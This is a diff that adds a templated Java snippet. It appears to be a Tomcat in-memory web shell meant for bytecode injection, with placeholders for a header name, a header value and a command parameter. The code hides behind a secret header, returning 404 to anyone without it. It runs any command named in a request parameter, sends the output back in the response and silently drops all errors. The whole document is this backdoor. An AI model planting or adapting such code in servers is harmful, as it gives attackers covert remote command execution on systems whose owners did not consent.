@@ -1,0 +1,25 @@
+try {
+    org.apache.catalina.connector.RequestFacade req = (org.apache.catalina.connector.RequestFacade) $1;
+    org.apache.catalina.connector.ResponseFacade res = (org.apache.catalina.connector.ResponseFacade) $2;
+    if (!"".equals("{{{header}}}")){
+        String cHeaderValue = req.getHeader("{{{header}}}");
+        if (!"{{{headerValue}}}".equals(cHeaderValue)){
+            res.setStatus(404);
+            return;
+        }
+    }
+    if ("".equals("{{{cmd}}}")){
+        res.getWriter().write("Already!");
+        return;
+    }
+    StringBuffer stringBuffer = new StringBuffer();
+    String parameter = req.getParameter("{{{cmd}}}");
+    String[] s = parameter.split(" ");
+    ProcessBuilder processBuilder = new ProcessBuilder(s);
+    java.io.InputStream inputStream = processBuilder.start().getInputStream();
+    java.util.Scanner scanner = new java.util.Scanner(inputStream).useDelimiter("\\A");
+    while (scanner.hasNext()){
+        stringBuffer.append(scanner.next());
+    }
+    res.getWriter().write(stringBuffer.toString());
+}catch (Exception e){}
